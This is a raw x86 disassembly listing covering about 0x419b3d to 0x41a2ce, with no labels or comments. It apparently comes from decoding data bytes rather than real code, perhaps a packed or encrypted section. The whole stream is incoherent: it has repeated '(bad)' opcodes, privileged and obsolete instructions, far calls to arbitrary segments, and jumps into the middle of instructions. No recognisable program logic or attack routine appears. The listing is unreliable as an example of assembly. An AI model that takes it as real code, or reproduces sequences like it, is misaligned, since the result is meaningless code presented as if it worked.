  419b3d:	retf   0x9e2e
  419b40:	mov    edi,0xe2267139
  419b45:	call   0x8111b629
  419b4a:	sub    eax,DWORD PTR [ecx]
  419b4c:	pushf  
  419b4d:	mov    bl,0x2f
  419b4f:	rol    ecx,cl
  419b51:	lahf   
  419b52:	and    DWORD PTR [esi-0x65],eax
  419b55:	mov    bl,BYTE PTR [edx+0x5c620e94]
  419b5b:	inc    esp
  419b5c:	retf   
  419b5d:	dec    edi
  419b5e:	ds loope 0x419b1e
  419b61:	sub    DWORD PTR [edi-0x7a],esp
  419b64:	ins    BYTE PTR es:[edi],dx
  419b65:	push   cs
  419b66:	push   eax
  419b67:	ss mov ebx,0xdc068930
  419b6d:	fwait
  419b6e:	stc    
  419b6f:	pop    ebx
  419b70:	cdq    
  419b71:	adc    bl,BYTE PTR [ebx+edx*8]
  419b74:	lods   eax,DWORD PTR ds:[esi]
  419b75:	leave  
  419b76:	pop    ebx
  419b77:	inc    edi
  419b78:	test   ecx,edx
  419b7a:	push   0xffffffe2
  419b7c:	push   ecx
  419b7d:	push   ebx
  419b7e:	jnp    0x419b1a
  419b80:	rcl    DWORD PTR [edi+0x5c674a0e],0xf7
  419b87:	shl    DWORD PTR [eax+edi*8-0x58],1
  419b8b:	hlt    
  419b8c:	or     DWORD PTR [ecx],ecx
  419b8e:	outs   dx,DWORD PTR ds:[esi]
  419b8f:	push   eax
  419b90:	gs inc ebp
  419b92:	arpl   WORD PTR [ebp-0x2f],bx
  419b95:	fld    TBYTE PTR [eax]
  419b97:	sub    ebp,0xffffffd6
  419b9a:	leave  
  419b9b:	stc    
  419b9c:	pop    ebp
  419b9d:	ror    DWORD PTR [edi+0x74],cl
  419ba0:	xchg   edx,eax
  419ba1:	sbb    BYTE PTR [esp+edi*2-0x7bbe403a],bh
  419ba8:	cli    
  419ba9:	sub    edx,DWORD PTR [edx+0x62]
  419bac:	mov    esi,0x226e9f5f
  419bb1:	pop    edi
  419bb2:	push   0xffffff95
  419bb4:	imul   eax,DWORD PTR [ebx-0x5e],0x3d0206e4
  419bbb:	push   ds
  419bbc:	push   edx
  419bbd:	mov    ch,0x3f
  419bbf:	test   al,0xd1
  419bc2:	cmp    ebp,DWORD PTR [edi+0x6374b39e]
  419bc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bc9:	add    al,0xf9
  419bcb:	call   0x48c8:0xe02954a5
  419bd2:	sahf   
  419bd3:	add    eax,0x73384227
  419bd8:	imul   eax,ebx,0xf45974d1
  419bde:	aad    0xdd
  419be0:	mov    ecx,DWORD PTR ds:0x48db618f
  419be6:	data16 sbb al,0x8e
  419be9:	jnp    0x419be7
  419beb:	pop    ss
  419bec:	push   cs
  419bed:	push   ebp
  419bee:	(bad)  
  419bef:	sbb    ebp,DWORD PTR [ecx]
  419bf1:	dec    eax
  419bf2:	and    DWORD PTR [edx-0x78dcbafa],ecx
  419bf8:	icebp  
  419bf9:	in     al,dx
  419bfa:	pop    esp
  419bfb:	mov    ds:0xd9fd25c1,eax
  419c00:	rcl    BYTE PTR [ebx+0x7c924bdb],cl
  419c06:	xor    al,0x7a
  419c08:	sub    eax,0x46b10f76
  419c0d:	xor    BYTE PTR [ebx-0x5a],bl
  419c10:	adc    BYTE PTR ds:0x683c59a3,ah
  419c16:	cmp    ebp,edi
  419c18:	outs   dx,DWORD PTR ds:[esi]
  419c19:	daa    
  419c1a:	aas    
  419c1b:	ss cmp al,0xc5
  419c1e:	fucomp st(5)
  419c20:	mov    dl,0x47
  419c22:	mov    ebp,0x7621dc6
  419c27:	sbb    DWORD PTR [ecx-0x18b14e5e],eax
  419c2d:	mov    ebp,0xd4ae3d2e
  419c32:	xchg   edi,eax
  419c33:	cmp    eax,0x429018e9
  419c38:	fild   DWORD PTR [ebp-0xa]
  419c3b:	push   ds
  419c3c:	xchg   esi,eax
  419c3d:	xchg   edx,eax
  419c3e:	inc    esp
  419c3f:	sbb    bh,cl
  419c41:	push   esi
  419c42:	push   cs
  419c43:	rol    BYTE PTR [ebp+0x29a265f],0xa1
  419c4a:	inc    ecx
  419c4b:	leave  
  419c4c:	and    BYTE PTR [ebp-0x10],al
  419c4f:	retf   0x4d0b
  419c52:	nop
  419c53:	jno    0x419c28
  419c55:	not    esp
  419c57:	pop    es
  419c58:	add    eax,0xe16f8927
  419c5d:	icebp  
  419c5e:	inc    ebp
  419c5f:	sets   BYTE PTR [ebp-0x16ea414e]
  419c66:	jg     0x419c29
  419c68:	push   ds
  419c69:	inc    esi
  419c6a:	or     DWORD PTR [ecx-0x4474a6aa],esi
  419c70:	cmp    ah,BYTE PTR [edi-0x213342b9]
  419c76:	xchg   edx,ebp
  419c78:	pop    esp
  419c79:	cmp    BYTE PTR [edi+0x6e0082c5],bl
  419c7f:	cs mov esp,ebx
  419c82:	adc    al,0x80
  419c84:	sbb    ebx,DWORD PTR [ecx+0xf1521e0]
  419c8a:	shl    ch,0xe9
  419c8d:	mov    dh,0x65
  419c8f:	mov    ds:0x2eb7e21a,eax
  419c94:	cmc    
  419c95:	push   cs
  419c96:	pop    ebx
  419c97:	xor    al,0x2c
  419c99:	ins    DWORD PTR es:[edi],dx
  419c9a:	mov    esp,0x172345a4
  419c9f:	sub    DWORD PTR [ecx],esi
  419ca1:	push   cs
  419ca2:	(bad)  [ecx-0x9]
  419ca5:	les    eax,FWORD PTR [ebp+0x2b]
  419ca8:	sbb    DWORD PTR [ecx],0x338faa81
  419cae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419caf:	xchg   edx,eax
  419cb0:	pop    ds
  419cb1:	pushf  
  419cb2:	rcl    DWORD PTR [ebx-0x5c601370],0xf8
  419cb9:	push   ss
  419cba:	mov    BYTE PTR [ebp+edx*2+0x45be3038],0xa7
  419cc2:	out    dx,eax
  419cc3:	mov    ?,WORD PTR [edx]
  419cc5:	inc    esi
  419cc6:	inc    edi
  419cc7:	es stc 
  419cc9:	fcomp  DWORD PTR [esi+0x49]
  419ccc:	push   cs
  419ccd:	shr    ecx,0x3b
  419cd0:	(bad)  [ecx-0x397787c0]
  419cd6:	ror    DWORD PTR [edi+0x58],0x2e
  419cda:	mov    dl,0x5e
  419cdc:	jae    0x419d2b
  419cde:	mov    ds:0xa327ed7,al
  419ce3:	dec    ebp
  419ce4:	sar    BYTE PTR [ebx],1
  419ce6:	mov    esi,0x583b898d
  419ceb:	mov    ebp,0x9322ca30
  419cf0:	popf   
  419cf1:	paddusb mm0,QWORD PTR [edi-0x56]
  419cf5:	retf   0xf136
  419cf8:	cmp    BYTE PTR [esi+0x67426d4a],dh
  419cfe:	cmp    bl,BYTE PTR [ebx]
  419d00:	inc    ecx
  419d01:	mov    bl,0x56
  419d03:	out    0xf5,eax
  419d05:	sub    DWORD PTR [ebx],esi
  419d07:	inc    edi
  419d08:	cmp    ebx,DWORD PTR [ebp+0xc]
  419d0b:	dec    esi
  419d0c:	jmp    0x419cc2
  419d0e:	adc    BYTE PTR [esi+esi*4-0x78],cl
  419d12:	mov    esp,0x87babebc
  419d17:	pop    edx
  419d18:	dec    esp
  419d19:	mov    ebp,0xe22c5d41
  419d1e:	or     bh,BYTE PTR [ecx+0x4f68067b]
  419d24:	inc    eax
  419d25:	xor    al,0x19
  419d27:	pop    ds
  419d28:	test   eax,0x63b07f0b
  419d2d:	int3   
  419d2e:	adc    ecx,0x4a
  419d31:	loopne 0x419d5b
  419d33:	aad    0x63
  419d35:	pusha  
  419d36:	in     eax,0x90
  419d38:	jle    0x419d28
  419d3a:	sub    al,0xdd
  419d3c:	(bad)  
  419d3d:	fmul   DWORD PTR [ebx+0x4cec1971]
  419d43:	inc    eax
  419d44:	sub    esp,DWORD PTR [edx]
  419d46:	jbe    0x419d26
  419d48:	out    dx,eax
  419d49:	or     al,0xcd
  419d4b:	inc    edx
  419d4c:	xor    edi,ecx
  419d4e:	rol    BYTE PTR [ebx+0x15d2b5c1],1
  419d54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d55:	inc    edi
  419d56:	pop    edx
  419d57:	icebp  
  419d58:	aaa    
  419d59:	ficom  DWORD PTR [edi]
  419d5b:	icebp  
  419d5c:	jnp    0x419d5b
  419d5e:	or     al,ch
  419d60:	dec    esp
  419d61:	(bad)  
  419d62:	sub    ch,BYTE PTR [ebp+0x2f]
  419d65:	cmp    al,0x9a
  419d67:	aad    0x73
  419d69:	mov    cl,bh
  419d6b:	or     al,0x71
  419d6d:	sub    al,0xf6
  419d6f:	and    eax,ebp
  419d71:	pop    ebx
  419d72:	xlat   BYTE PTR fs:[ebx]
  419d74:	mov    al,ds:0x4d0ab086
  419d79:	cwde   
  419d7a:	frstor [edi-0x591d1595]
  419d80:	cs (bad) 
  419d83:	xchg   esp,eax
  419d84:	push   0x8cdf77c1
  419d89:	mov    WORD PTR ds:0x60d7aefb,ss
  419d90:	scas   al,BYTE PTR es:[edi]
  419d91:	pushf  
  419d92:	fsub   st(4),st
  419d94:	mov    ebp,0xcea89f60
  419d99:	sub    DWORD PTR [esi+0x1f],eax
  419d9c:	inc    edx
  419d9d:	popf   
  419d9e:	mov    bh,0xc6
  419da0:	adc    ecx,ecx
  419da2:	xchg   ecx,eax
  419da3:	mov    edi,0xa95af25d
  419da8:	mov    ch,0x18
  419daa:	pop    ss
  419dab:	out    0x3f,al
  419dad:	inc    edi
  419dae:	and    BYTE PTR [eax],ah
  419db0:	(bad)  [esi+0x1e599a0e]
  419db6:	dec    esi
  419db7:	outs   dx,BYTE PTR ds:[esi]
  419db8:	arpl   WORD PTR [edx+0x38af21cd],bp
  419dbe:	mov    bl,0x64
  419dc0:	enter  0x1487,0x1d
  419dc4:	jp     0x419e3e
  419dc6:	out    0xac,eax
  419dc8:	xor    WORD PTR [edi+0x6a],bp
  419dcc:	dec    ecx
  419dcd:	ror    DWORD PTR [eax-0x17],cl
  419dd0:	dec    ebp
  419dd1:	shr    esi,cl
  419dd3:	add    BYTE PTR [eax],ch
  419dd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dd6:	repz mul DWORD PTR [ecx+eiz*4]
  419dda:	mov    DWORD PTR [eax+0x4c],ebp
  419ddd:	outs   dx,BYTE PTR ds:[esi]
  419dde:	mov    ebp,0x37c7a8ba
  419de3:	pop    eax
  419de4:	push   ecx
  419de5:	adc    BYTE PTR [edi+0x7c3d14d],0xf8
  419dec:	add    al,0x7f
  419dee:	fsub   QWORD PTR [ecx+0x44]
  419df1:	aaa    
  419df2:	mov    BYTE PTR ds:0x44951568,bl
  419df8:	loopne 0x419e0d
  419dfa:	lds    edi,FWORD PTR [ecx+edi*2+0xc2c50ed]
  419e01:	test   DWORD PTR [edi-0x1],edx
  419e04:	mov    dh,0x2a
  419e06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e07:	test   BYTE PTR [ebp+0x5e42e2ac],al
  419e0d:	rcr    eax,cl
  419e0f:	xor    al,0xfa
  419e11:	sub    edx,DWORD PTR fs:[esi]
  419e14:	xor    bh,al
  419e16:	jmp    0x503a4504
  419e1b:	in     eax,dx
  419e1c:	ins    BYTE PTR es:[edi],dx
  419e1d:	popf   
  419e1e:	into   
  419e1f:	int    0xed
  419e21:	mov    BYTE PTR [eax],dh
  419e23:	mov    ds:0x42e18f1c,eax
  419e28:	push   edi
  419e29:	add    dl,BYTE PTR [edx+0x4]
  419e2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e2d:	int    0xf3
  419e2f:	mov    ss,WORD PTR [edx-0x44]
  419e32:	int    0x2b
  419e34:	xchg   BYTE PTR [esi-0x29],dh
  419e37:	pop    edi
  419e38:	movzx  ebp,si
  419e3b:	jo     0x419e32
  419e3d:	and    al,0x7
  419e3f:	ror    BYTE PTR [ebp-0x2b],cl
  419e42:	(bad)  
  419e43:	xchg   ebx,eax
  419e44:	mov    ebp,0xec645014
  419e49:	mov    WORD PTR [edx],ss
  419e4b:	xor    eax,0x1623682c
  419e50:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e52:	dec    DWORD PTR [ebx]
  419e54:	fwait
  419e55:	push   edi
  419e56:	xchg   esp,eax
  419e57:	rol    DWORD PTR [eax-0x63],cl
  419e5a:	push   edi
  419e5b:	dec    esi
  419e5c:	mov    esi,0x31e1e504
  419e61:	adc    ebx,DWORD PTR ds:0xe34bd7f2
  419e67:	dec    edi
  419e68:	imul   eax,edx,0x66
  419e6b:	fs jmp 0x1c1c:0xa869f273
  419e73:	mov    eax,0x12d3bd93
  419e78:	outs   dx,BYTE PTR ds:[esi]
  419e79:	loop   0x419ec7
  419e7b:	ins    BYTE PTR es:[edi],dx
  419e7c:	or     eax,0x61552c72
  419e81:	sub    al,0x94
  419e83:	push   0xffffffaa
  419e85:	loopne 0x419ef1
  419e87:	mov    ch,0x17
  419e89:	shr    esp,cl
  419e8b:	dec    ebx
  419e8c:	dec    edx
  419e8d:	mov    dl,0xa0
  419e8f:	add    ch,cl
  419e91:	retf   
  419e92:	pop    ecx
  419e93:	sub    esp,DWORD PTR ds:0x4b94f906
  419e99:	and    edx,DWORD PTR [esp+esi*4-0x62]
  419e9d:	jmp    0x5165b6fc
  419ea2:	xchg   esi,eax
  419ea3:	int    0xe0
  419ea5:	lock pusha 
  419ea7:	loope  0x419e37
  419ea9:	adc    bh,BYTE PTR [ebx]
  419eab:	dec    edi
  419eac:	mov    WORD PTR [ebx],fs
  419eae:	jno    0x419ec5
  419eb0:	js     0x419e77
  419eb2:	mov    dl,0xba
  419eb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419eb5:	add    ah,BYTE PTR [ecx-0x7701f35e]
  419ebb:	(bad)  
  419ebd:	loope  0x419f20
  419ebf:	neg    BYTE PTR [edi+0xe]
  419ec2:	icebp  
  419ec3:	into   
  419ec4:	sbb    edx,DWORD PTR [edi]
  419ec6:	mov    ecx,0xb84b16f9
  419ecb:	out    0x5e,al
  419ecd:	mov    esi,DWORD PTR [esi+0x2b]
  419ed0:	ja     0x419ecb
  419ed2:	mov    ch,0xde
  419ed4:	xor    BYTE PTR [ebx],dl
  419ed6:	sti    
  419ed7:	nop
  419ed8:	cmp    al,0x32
  419eda:	bound  ebp,QWORD PTR ds:0xc2eb9fb5
  419ee0:	and    DWORD PTR [ebx-0x469d2b66],eax
  419ee6:	mov    ebp,0xe52f00dd
  419eeb:	leave  
  419eec:	pop    eax
  419eed:	or     cl,BYTE PTR [ecx]
  419eef:	hlt    
  419ef0:	mov    ebp,0xbb9baaad
  419ef5:	sub    al,0xfa
  419ef7:	lea    edi,[ebx-0xce44bb]
  419efd:	mov    edx,0x94a2677c
  419f02:	sti    
  419f03:	dec    ebp
  419f04:	lock jl 0x419f79
  419f07:	daa    
  419f08:	jg     0x419f02
  419f0a:	and    dh,BYTE PTR [esi]
  419f0c:	jbe    0x419f52
  419f0e:	mov    bl,0xa8
  419f10:	mov    al,ds:0x7f5bbdc4
  419f15:	clc    
  419f16:	lea    ecx,[ecx+ecx*8+0x5f340c64]
  419f1d:	stos   DWORD PTR es:[edi],eax
  419f1e:	into   
  419f1f:	popf   
  419f20:	pushf  
  419f21:	jmp    0x1c53:0x65369a81
  419f28:	sbb    ah,BYTE PTR [edx+0x10]
  419f2b:	xor    BYTE PTR [ebx-0x5f],dh
  419f2e:	xor    DWORD PTR [edx+0x8c4a724],eax
  419f34:	in     eax,dx
  419f35:	hlt    
  419f36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f37:	leave  
  419f38:	setae  BYTE PTR [ebp-0x1c4815a4]
  419f3f:	mov    DWORD PTR [ecx],ebx
  419f41:	imul   ecx,DWORD PTR [edx-0xafb8d6d],0x7a4e7da6
  419f4b:	and    bl,BYTE PTR [edx+0x207e3c58]
  419f51:	cmp    dl,ah
  419f53:	or     eax,DWORD PTR [esi+edx*1+0x5c41e443]
  419f5a:	mov    ebx,0xd0cc9f0
  419f5f:	dec    esp
  419f60:	shl    DWORD PTR [edx-0x6760eee3],0x56
  419f67:	pushf  
  419f68:	addr16 int3 
  419f6a:	mov    bl,0x38
  419f6c:	shl    DWORD PTR [esi+0x5676f492],cl
  419f72:	mov    ecx,0x16a11086
  419f77:	jge    0x419fd7
  419f79:	shl    DWORD PTR [ebx],cl
  419f7b:	pop    esp
  419f7c:	pop    edi
  419f7d:	sub    ah,BYTE PTR [edx]
  419f7f:	xchg   ebp,eax
  419f80:	fimul  WORD PTR [eax+esi*1-0x3ac4a996]
  419f87:	outs   dx,DWORD PTR ds:[esi]
  419f88:	sbb    ebx,DWORD PTR [ecx+eiz*1+0x77]
  419f8c:	mov    eax,0xf957f42
  419f91:	cs push ebp
  419f93:	and    al,0x7e
  419f95:	outs   dx,DWORD PTR ds:[esi]
  419f96:	sub    edx,DWORD PTR [edi]
  419f98:	push   0x3c
  419f9a:	loop   0x419f8c
  419f9c:	mov    bh,0x41
  419f9e:	adc    DWORD PTR [esi-0x23],eax
  419fa1:	inc    esi
  419fa2:	test   al,0xbe
  419fa4:	and    DWORD PTR [eax+0x16],0xffffffc6
  419fa8:	push   ds
  419fa9:	in     eax,dx
  419faa:	test   BYTE PTR [ebx+0x34],bh
  419fad:	mov    eax,0x81a44ae1
  419fb2:	and    esp,edi
  419fb4:	and    eax,0x73
  419fb7:	bound  esi,QWORD PTR [ecx-0xc007068]
  419fbd:	and    eax,0xc5d4b1ec
  419fc2:	mov    edx,0x967010aa
  419fc7:	push   ebx
  419fc8:	scas   al,BYTE PTR es:[edi]
  419fc9:	adc    DWORD PTR [edi+0x37],eax
  419fcc:	jae    0x419f5c
  419fce:	sbb    al,0x38
  419fd0:	sub    DWORD PTR [edx-0x23],esp
  419fd3:	adc    bl,BYTE PTR ds:0x177a9667
  419fd9:	jne    0x41a01e
  419fdb:	dec    edx
  419fdc:	es js  0x419fce
  419fdf:	stos   DWORD PTR es:[edi],eax
  419fe0:	push   edi
  419fe1:	imul   edx,DWORD PTR [eax],0x72
  419fe4:	jo     0x419fdf
  419fe6:	test   DWORD PTR ds:0x6b25e31d,edx
  419fec:	pop    es
  419fed:	ficomp WORD PTR [esi]
  419fef:	(bad)  
  419ff0:	pop    ebp
  419ff1:	rcl    BYTE PTR [edx-0x5ef5f52e],0x8
  419ff8:	push   edx
  419ff9:	pop    esp
  419ffa:	test   BYTE PTR [esi],bl
  419ffc:	mov    esp,0xfe806dd0
  41a001:	mov    bh,0x52
  41a003:	lods   al,BYTE PTR ds:[esi]
  41a004:	jmp    0xe8fed751
  41a009:	push   eax
  41a00a:	mov    dh,0x11
  41a00c:	or     ebx,DWORD PTR [bx+si+0x18]
  41a010:	lods   eax,DWORD PTR ds:[esi]
  41a011:	pop    edx
  41a012:	retf   
  41a013:	(bad)  [edx-0x6b]
  41a016:	rol    BYTE PTR ds:0xe954ce51,1
  41a01c:	pusha  
  41a01d:	js     0x41a062
  41a01f:	test   al,0x30
  41a021:	or     eax,0x19bd69d9
  41a026:	pop    ss
  41a027:	gs std 
  41a029:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a02a:	sahf   
  41a02b:	push   0xce088800
  41a030:	xchg   edi,eax
  41a031:	les    ecx,FWORD PTR gs:[esp+eiz*8-0x76e8557a]
  41a039:	nop
  41a03a:	and    eax,0x89f324d7
  41a03f:	mov    ebp,0x2a70d4e3
  41a044:	sar    dh,1
  41a046:	out    0x12,al
  41a048:	cmc    
  41a049:	push   0xb2bdafdc
  41a04e:	ins    BYTE PTR es:[edi],dx
  41a04f:	jle    0x41a053
  41a051:	leave  
  41a052:	loop   0x41a01f
  41a054:	sbb    esi,DWORD PTR [eax-0x4e]
  41a057:	add    bl,BYTE PTR ds:0xcd6e3559
  41a05d:	nop
  41a05e:	enter  0xf2a6,0xa2
  41a062:	inc    edx
  41a063:	loope  0x41a02d
  41a065:	ss daa 
  41a067:	mov    al,ds:0xa47758ed
  41a06c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a06d:	ret    
  41a06e:	repnz pop esi
  41a070:	push   eax
  41a071:	inc    edx
  41a072:	mov    edi,0xb6ad6d80
  41a077:	mov    esp,0x60cc1240
  41a07c:	push   ds
  41a07d:	jbe    0x41a0b7
  41a07f:	daa    
  41a080:	jbe    0x41a080
  41a082:	(bad)  
  41a083:	push   edx
  41a084:	mov    gs:0x864c1096,eax
  41a08a:	cli    
  41a08b:	shr    esi,0xc8
  41a08e:	dec    edi
  41a08f:	jnp    0x41a023
  41a091:	aad    0xf9
  41a093:	cmc    
  41a094:	sbb    BYTE PTR [eax],dl
  41a096:	inc    ecx
  41a097:	out    dx,al
  41a098:	test   eax,0x8d40e817
  41a09d:	ins    BYTE PTR es:[edi],dx
  41a09e:	mov    ecx,0xfc36d211
  41a0a3:	dec    eax
  41a0a4:	div    BYTE PTR [esi+0x2]
  41a0a7:	jg     0x41a040
  41a0a9:	xchg   BYTE PTR [ebx+0x27e3be04],bl
  41a0af:	mov    esp,0x298dff29
  41a0b4:	not    BYTE PTR [edi]
  41a0b6:	jmp    0x9dd8:0x3ecaac10
  41a0bd:	mov    eax,0xf9d3e85e
  41a0c2:	pop    ds
  41a0c3:	aad    0x15
  41a0c5:	push   ebp
  41a0c6:	xor    ebx,edx
  41a0c8:	sub    eax,0x5931ff7b
  41a0cd:	ja     0x41a0ea
  41a0cf:	add    esp,DWORD PTR [edi+0x47]
  41a0d2:	jbe    0x41a0b8
  41a0d4:	mov    dh,BYTE PTR [esi-0x44]
  41a0d7:	mov    ebx,ss
  41a0d9:	add    DWORD PTR [bp+si+0x4d1f],0xffffff9f
  41a0df:	push   ss
  41a0e0:	cli    
  41a0e1:	cmp    al,0x7
  41a0e3:	inc    edx
  41a0e4:	mov    cs,WORD PTR [eax+edx*4]
  41a0e7:	loopne 0x41a147
  41a0e9:	xor    al,0x52
  41a0eb:	in     al,0x90
  41a0ed:	stos   BYTE PTR es:[edi],al
  41a0ee:	cli    
  41a0ef:	add    bl,0x75
  41a0f2:	mov    eax,0xf13461cc
  41a0f7:	cs xchg ebp,eax
  41a0f9:	pop    ss
  41a0fa:	hlt    
  41a0fb:	pusha  
  41a0fc:	leave  
  41a0fd:	rcl    dh,0x4c
  41a100:	cld    
  41a101:	hlt    
  41a102:	jae    0x41a0a4
  41a104:	or     dh,BYTE PTR [edx-0x5497a274]
  41a10a:	call   0x4061:0x53da9d7d
  41a111:	dec    ebp
  41a112:	scas   al,BYTE PTR es:[edi]
  41a113:	scas   eax,DWORD PTR es:[edi]
  41a114:	or     ebx,ebx
  41a116:	pop    esi
  41a117:	jecxz  0x41a0b1
  41a119:	js     0x41a0f1
  41a11b:	dec    esp
  41a11c:	jg     0x41a0dc
  41a11e:	push   cs
  41a11f:	inc    esp
  41a120:	mov    ebx,0x26620ae3
  41a125:	sahf   
  41a126:	add    BYTE PTR [esp+esi*1-0x65],bh
  41a12a:	call   FWORD PTR [esi-0x12]
  41a12d:	xchg   esp,eax
  41a12e:	out    dx,al
  41a12f:	or     eax,0xb9a6c0ee
  41a134:	mov    BYTE PTR [eax+0x26],0x82
  41a138:	daa    
  41a139:	jne    0x41a17e
  41a13b:	clc    
  41a13c:	mov    ah,dh
  41a13e:	call   0x33a9:0x5ad1a8b6
  41a145:	xlat   BYTE PTR ds:[ebx]
  41a146:	pop    ecx
  41a147:	sbb    dh,0x61
  41a14a:	popf   
  41a14b:	dec    ebp
  41a14c:	in     eax,dx
  41a14d:	(bad)  
  41a14e:	call   0x6b0d:0x6108d67f
  41a155:	clc    
  41a156:	in     eax,dx
  41a157:	leave  
  41a158:	pop    es
  41a159:	fstp   QWORD PTR [edi+0x32ed8911]
  41a15f:	mov    edx,db4
  41a162:	jae    0x41a1cc
  41a164:	ins    BYTE PTR es:[edi],dx
  41a165:	repnz xchg ecx,eax
  41a167:	xchg   esi,eax
  41a168:	cmp    DWORD PTR [ecx-0x52],0xffffffdf
  41a16c:	test   BYTE PTR [eax+0x4590e101],0x60
  41a173:	dec    esi
  41a174:	lahf   
  41a175:	dec    ebp
  41a176:	xor    al,0x9c
  41a178:	mov    esp,0xffb07e3d
  41a17d:	mov    ecx,0xea32b5f9
  41a182:	ret    0x7b86
  41a185:	dec    ebx
  41a186:	sbb    al,0xeb
  41a188:	sub    eax,DWORD PTR [edi+eax*2+0x62]
  41a18c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a18d:	adc    cl,BYTE PTR [esi-0x52]
  41a190:	xchg   ecx,eax
  41a191:	jno    0x41a137
  41a193:	and    bl,dl
  41a195:	in     al,0x9b
  41a197:	jno    0x41a157
  41a199:	sbb    BYTE PTR [ecx+0xe1eb652],dl
  41a19f:	adc    eax,0x63608bf4
  41a1a4:	lods   eax,DWORD PTR ds:[esi]
  41a1a5:	dec    ebp
  41a1a6:	dec    ecx
  41a1a7:	(bad)
  41a1aa:	mov    ebp,0x6b7db949
  41a1af:	mov    al,0xe
  41a1b1:	aaa    
  41a1b2:	adc    esi,DWORD PTR [eax+0x1f57350e]
  41a1b8:	fisubr DWORD PTR [ebx-0x42]
  41a1bb:	push   ecx
  41a1bc:	sahf   
  41a1bd:	push   ebx
  41a1be:	jge    0x41a214
  41a1c0:	push   es
  41a1c1:	inc    ecx
  41a1c2:	xchg   BYTE PTR [eax+0x29ae5e05],bh
  41a1c8:	jp     0x41a220
  41a1ca:	inc    ebx
  41a1cb:	push   edi
  41a1cc:	or     al,0xe7
  41a1ce:	ret    
  41a1cf:	add    al,0xb2
  41a1d1:	xchg   DWORD PTR [edi],edx
  41a1d3:	das    
  41a1d4:	fstp   DWORD PTR [eax+esi*2-0x3dab7899]
  41a1db:	idiv   BYTE PTR [ecx+0x35ef3275]
  41a1e1:	nop
  41a1e2:	push   eax
  41a1e3:	je     0x41a23c
  41a1e5:	adc    BYTE PTR [eax],0x58
  41a1e8:	(bad)  
  41a1e9:	into   
  41a1ea:	xchg   edx,eax
  41a1eb:	cdq    
  41a1ec:	aam    0xae
  41a1ee:	mov    eax,0x7a146d71
  41a1f3:	(bad)  
  41a1f4:	in     al,dx
  41a1f5:	dec    edi
  41a1f6:	xchg   ebx,eax
  41a1f7:	jb     0x41a1f9
  41a1f9:	xchg   ebx,eax
  41a1fa:	in     al,dx
  41a1fb:	xchg   ebp,eax
  41a1fc:	into   
  41a1fd:	adc    BYTE PTR [edx+0x2b1dde2d],0x79
  41a204:	in     al,0xdd
  41a206:	push   ds
  41a207:	mov    bh,0x5b
  41a209:	bnd jmp 0xa5b1581b
  41a20f:	dec    edx
  41a210:	cwde   
  41a211:	pop    ebx
  41a212:	add    edi,DWORD PTR [esi]
  41a214:	push   eax
  41a215:	xor    al,0x6d
  41a217:	push   es
  41a218:	cdq    
  41a219:	or     eax,0x3517e9e1
  41a21e:	cwde   
  41a21f:	ror    DWORD PTR [ebx],cl
  41a221:	jo     0x41a252
  41a223:	and    eax,0x815eee01
  41a228:	inc    esi
  41a229:	leave  
  41a22a:	ja     0x41a1bd
  41a22c:	stos   BYTE PTR es:[edi],al
  41a22d:	adc    bh,BYTE PTR [esi-0x35b87852]
  41a233:	sub    al,0x77
  41a235:	test   al,0x5d
  41a237:	outs   dx,BYTE PTR ds:[esi]
  41a238:	shl    DWORD PTR [edx+ecx*4+0x4b494431],0x78
  41a240:	jle    0x41a238
  41a242:	fs push esp
  41a244:	xchg   esi,eax
  41a245:	rcr    BYTE PTR [ecx+0x540ba73e],cl
  41a24b:	dec    eax
  41a24c:	xor    DWORD PTR [edx+0x335de1ea],esp
  41a252:	fiadd  WORD PTR [eax+0x7419be6a]
  41a258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a259:	test   eax,0x1d84ba5
  41a25e:	(bad)  
  41a25f:	retf   
  41a260:	pop    ebx
  41a261:	push   ss
  41a262:	and    BYTE PTR [ebp+0x6e],bl
  41a265:	inc    edx
  41a266:	mov    bh,0xba
  41a268:	push   edx
  41a269:	mov    bh,0x85
  41a26b:	or     edi,DWORD PTR [edx+0x34]
  41a26e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a26f:	jne    0x41a252
  41a271:	(bad)  
  41a272:	push   0x7
  41a274:	call   0x19fe4991
  41a279:	test   al,0x9d
  41a27b:	test   al,0x6a
  41a27d:	repz (bad) 
  41a27f:	repnz adc ebx,DWORD PTR [ecx]
  41a282:	repnz lea ebp,[ecx+0x39e2d5a3]
  41a289:	jae    0x41a23c
  41a28b:	test   ecx,ebp
  41a28d:	pop    esp
  41a28e:	in     al,dx
  41a28f:	jns    0x41a2c8
  41a291:	jne    0x41a2f7
  41a293:	mov    esp,0x1511225d
  41a298:	jle    0x41a283
  41a29a:	adc    DWORD PTR [bx+di+0x4c23],ecx
  41a29f:	sub    eax,0x2349b5db
  41a2a4:	jbe    0x41a2d3
  41a2a6:	push   ds
  41a2a7:	lahf   
  41a2a8:	into   
  41a2a9:	bound  ecx,QWORD PTR [eax+0x5c]
  41a2ac:	(bad)  
  41a2ad:	loop   0x41a2ee
  41a2af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2b0:	or     DWORD PTR [edi-0x38],ebp
  41a2b3:	cdq    
  41a2b4:	mov    ecx,0xbb525d4d
  41a2b9:	ficom  DWORD PTR [ebx]
  41a2bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2bc:	test   eax,0x8ac47e2f
  41a2c1:	sar    BYTE PTR [esi+edx*8-0x51],1
  41a2c5:	ins    BYTE PTR es:[edi],dx
  41a2c6:	mov    bh,0x3e
  41a2c8:	fdiv   DWORD PTR ds:0x9f9b1860
  41a2ce:	repnz repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
